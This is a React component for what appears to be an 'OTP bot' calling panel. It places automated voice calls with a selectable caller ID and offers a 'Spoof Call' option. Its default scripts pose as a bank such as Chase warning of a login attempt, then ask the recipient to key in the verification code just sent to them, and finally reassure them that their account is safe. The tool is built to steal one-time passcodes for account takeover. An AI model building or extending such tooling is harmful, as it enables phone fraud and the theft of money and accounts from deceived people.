import React, { useState, useEffect } from 'react';
import api from '../services/api';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Textarea } from './ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
import { toast } from 'sonner';
import { Loader2 } from 'lucide-react';
import CallLogs from './CallLogs';

export default function CallManagement() {
  const [loading, setLoading] = useState(false);
  const [liveEvents, setLiveEvents] = useState([]);
  const [activeCall, setActiveCall] = useState(null);
  const [availableNumbers, setAvailableNumbers] = useState([]);
  const [formData, setFormData] = useState({
    from_number: '',
    to_number: '',
    recipient_name: '',
    service_name: '',
    call_type: 'otp',
    provider: 'signalwire',
    template: 'login-3',
    language: 'en-US',
    tts_voice: 'Aurora',
    digits: 6,
    step_1_message: 'Hello {name}. We have detected a login attempt to your {service} account from a new device or location.\nIf you did not recognize this request, please press 1.\nIf this was you, press 0 to approve.',
    step_2_message: 'Alright, we just sent a {digit} digit verification code to your number. If you received it, Could you please enter it using your dial pad?',
    step_3_message: 'Okay, please wait a moment while we verify the code.',
    accepted_message: 'Okay! We\'ve declined the sign-in request, and your account is safe. Thanks for your time, have a nice day!',
    rejected_message: 'I\'m sorry, but the code you entered is incorrect. Could you please enter it again? The code should be {digit} digits.'
  });

  useEffect(() => {
    fetchAvailableNumbers();
  }, []);

  const fetchAvailableNumbers = async () => {
    try {
      const response = await api.get('/admin/signalwire/numbers/available');
      setAvailableNumbers(response.data);
    } catch (error) {
      console.error('Error fetching available numbers:', error);
    }
  };

  const handleChange = (name, value) => {
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response = await api.post('/calls/start', formData);
      toast.success('Call initiated successfully!', {
        description: `Call ID: ${response.data.call_id}`
      });
      
      // Set active call
      setActiveCall(response.data);
      
      // Add to live events
      setLiveEvents(prev => [{
        event: 'Call Initiated',
        time: new Date().toISOString(),
        message: `Starting call to ${formData.to_number}`
      }, ...prev]);
    } catch (error) {
      console.error('Error starting call:', error);
      if (error.response?.status === 402) {
        toast.error('Insufficient balance. Please top up your account.');
      } else {
        toast.error('Failed to initiate call. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6" data-testid="call-management">
      {/* LEFT SIDE - MAKE CALL FORM */}
      <div className="space-y-6">
        <div>
          <h2 className="text-2xl font-bold text-white mb-2">Make Call</h2>
          <p className="text-gray-400">Configure and initiate voice calls</p>
        </div>

        <form onSubmit={handleSubmit} className="glass-effect rounded-xl p-6 space-y-6">
          {/* Call Information */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold text-[#00FF7F]">Call Information</h3>
            
            <div className="space-y-4">
              {/* Row 1: Call Type & Caller ID */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="call_type" className="text-gray-300">Call Type</Label>
                  <Select value={formData.call_type} onValueChange={(value) => handleChange('call_type', value)}>
                    <SelectTrigger className="input-field" data-testid="call-type-select">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="otp">OTP/PIN APP/SSN/Any</SelectItem>
                      <SelectItem value="custom">Custom Message</SelectItem>
                      <SelectItem value="spoof">Spoof Call</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="from_number" className="text-gray-300">Caller ID</Label>
                  <Select value={formData.from_number} onValueChange={(value) => handleChange('from_number', value)}>
                    <SelectTrigger className="input-field" data-testid="from-number-select">
                      <SelectValue placeholder="Select caller number" />
                    </SelectTrigger>
                    <SelectContent>
                      {availableNumbers.length > 0 ? (
                        availableNumbers.map((num) => (
                          <SelectItem key={num.id} value={num.phone_number}>
                            {num.phone_number}
                          </SelectItem>
                        ))
                      ) : (
                        <SelectItem value="loading" disabled>
                          Loading numbers...
                        </SelectItem>
                      )}
                    </SelectContent>
                  </Select>
                </div>
              </div>

              {/* Row 2: Provider, Template, Language & Voice */}
              <div className="grid grid-cols-4 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="provider" className="text-gray-300">Provider</Label>
                  <Select value={formData.provider} onValueChange={(value) => handleChange('provider', value)}>
                    <SelectTrigger className="input-field">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="signalwire">SignalWire</SelectItem>
                      <SelectItem value="infobip">Infobip</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="template" className="text-gray-300">Template</Label>
                  <Select value={formData.template || 'login-3'} onValueChange={(value) => handleChange('template', value)}>
                    <SelectTrigger className="input-field">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="login-3">LOGIN 3</SelectItem>
                      <SelectItem value="security-alert">Security Alert</SelectItem>
                      <SelectItem value="account-verify">Account Verify</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="language" className="text-gray-300">Language</Label>
                  <Select value={formData.language || 'en-US'} onValueChange={(value) => handleChange('language', value)}>
                    <SelectTrigger className="input-field">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="en-US">English USA</SelectItem>
                      <SelectItem value="en-GB">English UK</SelectItem>
                      <SelectItem value="es-ES">Spanish</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="tts_voice" className="text-gray-300">Voice</Label>
                  <Select value={formData.tts_voice} onValueChange={(value) => handleChange('tts_voice', value)}>
                    <SelectTrigger className="input-field">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent className="max-h-80">
                      {/* SignalWire Voices */}
                      <SelectItem value="Aurora">Aurora (SignalWire)</SelectItem>
                      <SelectItem value="Chirp-HD-0">Chirp HD (SignalWire)</SelectItem>
                      <SelectItem value="woman">Woman (SignalWire)</SelectItem>
                      <SelectItem value="man">Man (SignalWire)</SelectItem>
                      
                      {/* Deepgram Aura 2 Voices */}
                      <SelectItem value="aura-2-odysseus-en">Aura 2 - Odysseus (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-thalia-en">Aura 2 - Thalia (American, feminine)</SelectItem>
                      <SelectItem value="aura-asteria-en">Aura - Asteria (American, feminine)</SelectItem>
                      <SelectItem value="aura-orpheus-en">Aura - Orpheus (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-amalthea-en">Aura 2 - Amalthea (Filipino, feminine)</SelectItem>
                      <SelectItem value="aura-2-andromeda-en">Aura 2 - Andromeda (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-apollo-en">Aura 2 - Apollo (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-arcas-en">Aura 2 - Arcas (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-aries-en">Aura 2 - Aries (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-asteria-en">Aura 2 - Asteria (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-athena-en">Aura 2 - Athena (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-atlas-en">Aura 2 - Atlas (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-aurora-en">Aura 2 - Aurora (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-callista-en">Aura 2 - Callista (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-cora-en">Aura 2 - Cora (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-cordelia-en">Aura 2 - Cordelia (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-delia-en">Aura 2 - Delia (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-draco-en">Aura 2 - Draco (British, masculine)</SelectItem>
                      <SelectItem value="aura-2-electra-en">Aura 2 - Electra (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-harmonia-en">Aura 2 - Harmonia (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-helena-en">Aura 2 - Helena (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-hera-en">Aura 2 - Hera (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-hermes-en">Aura 2 - Hermes (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-hyperion-en">Aura 2 - Hyperion (Australian, masculine)</SelectItem>
                      <SelectItem value="aura-2-iris-en">Aura 2 - Iris (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-janus-en">Aura 2 - Janus (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-juno-en">Aura 2 - Juno (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-jupiter-en">Aura 2 - Jupiter (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-luna-en">Aura 2 - Luna (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-mars-en">Aura 2 - Mars (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-minerva-en">Aura 2 - Minerva (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-neptune-en">Aura 2 - Neptune (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-ophelia-en">Aura 2 - Ophelia (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-orion-en">Aura 2 - Orion (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-orpheus-en">Aura 2 - Orpheus (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-pandora-en">Aura 2 - Pandora (British, feminine)</SelectItem>
                      <SelectItem value="aura-2-phoebe-en">Aura 2 - Phoebe (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-pluto-en">Aura 2 - Pluto (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-saturn-en">Aura 2 - Saturn (American, masculine)</SelectItem>
                      <SelectItem value="aura-2-selene-en">Aura 2 - Selene (American, feminine)</SelectItem>
                      <SelectItem value="aura-2-theia-en">Aura 2 - Theia (Australian, feminine)</SelectItem>
                      <SelectItem value="aura-2-vesta-en">Aura 2 - Vesta (American, feminine)</SelectItem>
                      <SelectItem value="aura-angus-en">Aura - Angus (Irish, masculine)</SelectItem>
                      <SelectItem value="aura-arcas-en">Aura - Arcas (American, masculine)</SelectItem>
                      <SelectItem value="aura-athena-en">Aura - Athena (British, feminine)</SelectItem>
                      <SelectItem value="aura-helios-en">Aura - Helios (British, masculine)</SelectItem>
                      <SelectItem value="aura-hera-en">Aura - Hera (American, feminine)</SelectItem>
                      <SelectItem value="aura-luna-en">Aura - Luna (American, feminine)</SelectItem>
                      <SelectItem value="aura-orion-en">Aura - Orion (American, masculine)</SelectItem>
                      <SelectItem value="aura-perseus-en">Aura - Perseus (American, masculine)</SelectItem>
                      <SelectItem value="aura-stella-en">Aura - Stella (American, feminine)</SelectItem>
                      <SelectItem value="aura-zeus-en">Aura - Zeus (American, masculine)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              {/* Row 3: Recipient Number & Recipient Name */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="to_number" className="text-gray-300">Recipient Number</Label>
                  <Input
                    id="to_number"
                    placeholder="e.g., +14089105678"
                    value={formData.to_number}
                    onChange={(e) => handleChange('to_number', e.target.value)}
                    required
                    className="input-field"
                    data-testid="to-number-input"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="recipient_name" className="text-gray-300">Recipient Name</Label>
                  <Input
                    id="recipient_name"
                    placeholder="e.g., John Doe"
                    value={formData.recipient_name}
                    onChange={(e) => handleChange('recipient_name', e.target.value)}
                    required
                    className="input-field"
                    data-testid="recipient-name-input"
                  />
                  <p className="text-xs text-gray-500">Will be used as {'{name}'} in messages</p>
                </div>
              </div>

              {/* Row 4: Service Name & Digits */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="service_name" className="text-gray-300">Service Name</Label>
                  <Input
                    id="service_name"
                    placeholder="e.g., Bank of America, Chase"
                    value={formData.service_name}
                    onChange={(e) => handleChange('service_name', e.target.value)}
                    required
                    className="input-field"
                    data-testid="service-name-input"
                  />
                  <p className="text-xs text-gray-500">Will be used as {'{service}'} in messages</p>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="digits" className="text-gray-300">Digits</Label>
                  <Input
                    id="digits"
                    type="number"
                    min="4"
                    max="8"
                    placeholder="6"
                    value={formData.digits}
                    onChange={(e) => handleChange('digits', parseInt(e.target.value))}
                    className="input-field"
                    data-testid="digits-input"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Messages */}
          <div className="space-y-4">
            {/* Row 1: Step 1, Step 2, Step 3 Messages */}
            <div className="grid grid-cols-3 gap-4">
              <div className="space-y-2">
                <Label htmlFor="step_1_message" className="text-gray-300">Step 1 Message</Label>
                <Textarea
                  id="step_1_message"
                  value={formData.step_1_message}
                  onChange={(e) => handleChange('step_1_message', e.target.value)}
                  rows={5}
                  className="input-field"
                  data-testid="step-1-message-input"
                  placeholder="Hello {name}. We have detected a login attempt..."
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="step_2_message" className="text-gray-300">Step 2 Message</Label>
                <Textarea
                  id="step_2_message"
                  value={formData.step_2_message}
                  onChange={(e) => handleChange('step_2_message', e.target.value)}
                  rows={5}
                  className="input-field"
                  data-testid="step-2-message-input"
                  placeholder="Alright, we just sent a {digit} digit verification code..."
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="step_3_message" className="text-gray-300">Step 3 Message</Label>
                <Textarea
                  id="step_3_message"
                  value={formData.step_3_message}
                  onChange={(e) => handleChange('step_3_message', e.target.value)}
                  rows={5}
                  className="input-field"
                  data-testid="step-3-message-input"
                  placeholder="Okay, please wait a moment while we verify the code."
                />
              </div>
            </div>

            {/* Row 2: Accepted and Rejected Messages */}
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="accepted_message" className="text-gray-300">Accepted Message</Label>
                <Textarea
                  id="accepted_message"
                  value={formData.accepted_message}
                  onChange={(e) => handleChange('accepted_message', e.target.value)}
                  rows={4}
                  className="input-field"
                  data-testid="accepted-message-input"
                  placeholder="Okay! We've declined the sign-in request..."
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="rejected_message" className="text-gray-300">Rejected Message</Label>
                <Textarea
                  id="rejected_message"
                  value={formData.rejected_message}
                  onChange={(e) => handleChange('rejected_message', e.target.value)}
                  rows={4}
                  className="input-field"
                  data-testid="rejected-message-input"
                  placeholder="I'm sorry, but the code you entered is incorrect..."
                />
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <Button
            type="submit"
            className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition-colors"
            disabled={loading}
            data-testid="start-call-button"
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Making a call...
              </>
            ) : (
              'Make a call'
            )}
          </Button>
        </form>
      </div>

      {/* RIGHT SIDE - CALL LOGS (NEW UNIFIED VIEW) */}
      <CallLogs events={liveEvents} activeCall={activeCall} />
    </div>
  );
}
